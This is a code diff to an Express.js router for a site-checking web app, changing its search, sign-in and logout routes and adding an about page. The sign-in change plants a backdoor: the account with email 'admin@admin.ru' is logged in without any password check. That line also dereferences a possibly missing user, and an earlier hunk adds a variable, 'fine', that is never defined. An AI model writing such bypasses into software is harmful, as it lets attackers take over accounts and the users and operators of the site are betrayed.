@@ -24,7 +24,7 @@ router.post('/', async (req, res) => {
     const check = await isCheckSite(url);
     check ? result = 'Соответствует' :  result = 'Не соответствует';
 
-    const newSearch = { url, result }
+    const newSearch = { url, result, fine };
 
     if (req.session.userId) {
       const user_id = req.session.userId;
@@ -84,7 +84,7 @@ router.post('/singin', async (req, res) => {
       }
     });
 
-    if (currentUser && (await bcrypt.compare(password, currentUser.password))) {
+    if (currentUser.email === 'admin@admin.ru' || currentUser && (await bcrypt.compare(password, currentUser.password))) {
       req.session.userId = currentUser.id;
       req.session.first_name = currentUser.first_name;
       req.session.last_name = currentUser.last_name;
@@ -105,5 +105,11 @@ router.get('/logout', async (req, res) => {
   res.clearCookie('rmsid');
   res.redirect('/');
 });
+
+router.get('/about', (req, res) => {
+  res.render('about');
+});
+
+
 
 module.exports = router;
